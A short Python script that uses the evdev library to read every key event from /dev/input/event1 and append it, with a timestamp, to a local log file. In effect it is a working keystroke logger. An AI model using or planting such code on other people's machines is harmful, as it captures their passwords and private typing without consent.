#!/usr/bin/python3

from evdev import InputDevice, categorize, ecodes
import time
dev = InputDevice('/dev/input/event1')

log_file = open('logfile','a')

for event in dev.read_loop():
    if event.type == ecodes.EV_KEY:
        st = str(categorize(event))
        local_time = time.asctime( time.localtime(time.time()))
        log_file.write("{}:  {}\n".format(local_time, st))
        log_file.flush()
